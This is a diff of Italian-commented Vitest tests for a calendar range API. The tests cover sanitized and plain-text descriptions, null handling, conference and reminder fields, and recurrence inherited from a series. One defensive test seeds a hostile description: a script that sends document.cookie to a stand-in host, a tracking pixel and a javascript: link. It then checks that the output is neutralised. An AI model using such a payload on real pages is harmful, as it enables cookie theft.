@@ -2,12 +2,14 @@ import { randomUUID } from "node:crypto";
 import {
   calendarEvents,
   calendarSeries,
+  calendarSeriesRecurrence,
   googleAccounts,
   googleWorkspaces,
   projects,
   type Db,
 } from "@stubwise/db";
 import type { TestDb } from "@stubwise/db/testing";
+import { eq } from "drizzle-orm";
 import { startTestDb } from "@stubwise/db/testing";
 import type { FastifyInstance } from "fastify";
 import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
@@ -219,6 +221,148 @@ describe("GET /api/me/calendar/range (fase 9, Task 3)", () => {
     const res = await getRange(adminCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
     expect(res.statusCode).toBe(200);
     expect(res.json().items).toEqual([]);
+  });
+
+  // -------------------------------------------------------------------------
+  // 15 set 2026 (§2): i campi nuovi, e la descrizione come HTML NON FIDATO.
+  // -------------------------------------------------------------------------
+
+  it("⚠️ la descrizione esce SANIFICATA e la colonna la contiene ancora GREZZA", async () => {
+    const { accountId } = await seedAccount(memberId);
+    const hostile =
+      '<p>Ordine del giorno</p><script>fetch("https://evil.test/"+document.cookie)</script>' +
+      '<img src="https://tracker.test/pixel.gif"><a href="javascript:alert(1)">clicca</a>';
+    const id = await seedCalendarEvent(accountId, {
+      title: "Con descrizione ostile",
+      startsAt: new Date("2026-09-15T09:00:00.000Z"),
+      description: hostile,
+    });
+
+    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
+    const [item] = res.json().items;
+
+    // Fuori: niente script, niente `src` remoto (spostato in `data-src`,
+    // così la richiesta non parte finché chi legge non la chiede), niente
+    // `javascript:` negli href.
+    expect(item.descriptionHtml).not.toContain("<script");
+    expect(item.descriptionHtml).not.toContain("evil.test");
+    // `\ssrc="` e non la sottostringa nuda: `data-src="…"` la conterrebbe,
+    // e il test passerebbe per il motivo sbagliato — è l'attributo `src`
+    // VERO che non deve esistere, perché è quello che fa partire la
+    // richiesta al pixel di tracciamento.
+    expect(/\ssrc="/.test(item.descriptionHtml)).toBe(false);
+    expect(item.descriptionHtml).toContain('data-src="https://tracker.test/pixel.gif"');
+    expect(item.descriptionHtml).not.toContain("javascript:");
+    expect(item.descriptionHtml).toContain("Ordine del giorno");
+
+    // Dentro: ANCORA GREZZA. È il punto dell'invariante — col grezzo in
+    // colonna una correzione al filtro vale retroattivamente, senza
+    // migrazioni di dati. La lettura non riscrive la riga.
+    const [row] = await db.select().from(calendarEvents).where(eq(calendarEvents.id, id));
+    expect(row!.description).toBe(hostile);
+  });
+
+  it("la descrizione arriva anche come TESTO, per chi non rende HTML (l'app)", async () => {
+    const { accountId } = await seedAccount(memberId);
+    await seedCalendarEvent(accountId, {
+      title: "Con descrizione",
+      startsAt: new Date("2026-09-15T09:00:00.000Z"),
+      description: "<p>Primo punto</p><p>Secondo punto</p>",
+    });
+
+    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
+    const [item] = res.json().items;
+    expect(item.descriptionText).toContain("Primo punto");
+    expect(item.descriptionText).toContain("Secondo punto");
+    expect(item.descriptionText).not.toContain("<p>");
+  });
+
+  it("un evento SPOGLIO non produce stringhe vuote dove il senso è «non c'era»", async () => {
+    const { accountId } = await seedAccount(memberId);
+    await seedCalendarEvent(accountId, {
+      title: "Spoglio",
+      startsAt: new Date("2026-09-15T09:00:00.000Z"),
+    });
+
+    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
+    const [item] = res.json().items;
+    // `null`, non `""`: la UI distingue «non c'era» da «c'era ed era vuoto»
+    // e non disegna un blocco «Dove» senza niente dentro.
+    expect(item.descriptionHtml).toBeNull();
+    expect(item.descriptionText).toBeNull();
+    expect(item.location).toBeNull();
+    expect(item.hangoutLink).toBeNull();
+    expect(item.conferenceEntryPoints).toEqual([]);
+    expect(item.reminders).toEqual([]);
+    expect(item.remindersUseDefault).toBe(false);
+    expect(item.recurrence).toEqual([]);
+  });
+
+  it("una descrizione fatta di soli spazi vale «non c'era», non una cornice vuota", async () => {
+    const { accountId } = await seedAccount(memberId);
+    await seedCalendarEvent(accountId, {
+      title: "Quasi spoglio",
+      startsAt: new Date("2026-09-15T09:00:00.000Z"),
+      description: "   \n  ",
+    });
+
+    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
+    expect(res.json().items[0].descriptionHtml).toBeNull();
+  });
+
+  it("luogo, link per partecipare e promemoria arrivano com'erano", async () => {
+    const { accountId } = await seedAccount(memberId);
+    await seedCalendarEvent(accountId, {
+      title: "Con tutto",
+      startsAt: new Date("2026-09-15T09:00:00.000Z"),
+      location: "Sala Grande, via Roma 1",
+      hangoutLink: "https://meet.google.com/abc-defg-hij",
+      conferenceEntryPoints: [
+        { type: "phone", uri: "tel:+39061234567", label: "+39 06 1234567", pin: "998877" },
+      ],
+      reminders: [{ method: "popup", minutes: 10 }],
+      remindersUseDefault: true,
+    });
+
+    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
+    const [item] = res.json().items;
+    expect(item.location).toBe("Sala Grande, via Roma 1");
+    expect(item.hangoutLink).toBe("https://meet.google.com/abc-defg-hij");
+    expect(item.conferenceEntryPoints).toEqual([
+      { type: "phone", uri: "tel:+39061234567", label: "+39 06 1234567", pin: "998877" },
+    ]);
+    expect(item.reminders).toEqual([{ method: "popup", minutes: 10 }]);
+    expect(item.remindersUseDefault).toBe(true);
+  });
+
+  it("la ricorrenza viene dalla SERIE, ed è la stessa su ogni occorrenza (Task 7)", async () => {
+    const { accountId } = await seedAccount(memberId);
+    await db.insert(calendarSeriesRecurrence).values({
+      accountId,
+      recurringEventId: "serie-1",
+      recurrence: ["RRULE:FREQ=WEEKLY;BYDAY=MO"],
+    });
+    for (const day of [15, 22]) {
+      await seedCalendarEvent(accountId, {
+        title: "Riunione settimanale",
+        startsAt: new Date(`2026-09-${day}T09:00:00.000Z`),
+        recurringEventId: "serie-1",
+      });
+    }
+    // Un evento singolo nello stesso intervallo: non deve ereditare niente.
+    await seedCalendarEvent(accountId, {
+      title: "Singolo",
+      startsAt: new Date("2026-09-16T09:00:00.000Z"),
+    });
+
+    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
+    const items: { title: string; recurrence: string[] }[] = res.json().items;
+    const occurrences = items.filter((item) => item.title === "Riunione settimanale");
+    expect(occurrences).toHaveLength(2);
+    for (const occurrence of occurrences) {
+      expect(occurrence.recurrence).toEqual(["RRULE:FREQ=WEEKLY;BYDAY=MO"]);
+    }
+    expect(items.find((item) => item.title === "Singolo")!.recurrence).toEqual([]);
   });
 
   it("'to' <= 'from': 400 invalid_range", async () => {
